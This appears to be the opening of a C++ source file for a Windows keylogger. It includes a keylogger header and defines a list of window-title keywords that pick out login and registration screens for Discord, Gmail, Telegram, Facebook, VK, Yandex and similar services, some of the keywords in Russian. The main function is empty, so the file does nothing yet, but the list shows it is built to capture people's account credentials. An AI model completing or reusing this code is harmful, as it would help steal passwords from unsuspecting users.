#include <Windows.h>
#include <tchar.h>
#include <string>
#include "Keylogger.h"

#ifndef UNICODE
#define UNICODE
#endif // !UNICODE

std::vector<std::wstring> filters = { L"Discord", L"VK", L"Google", L"Yandex", L"Youtube", L"Gmail",
									  L"Telegram", L"Facebook", L"Viber", L"Authorization", L"Регистрация", L"Вход", L"Login", L"log in", L"sign up" };

int wmain(int argc, wchar_t argv[])
{

	return 0;
}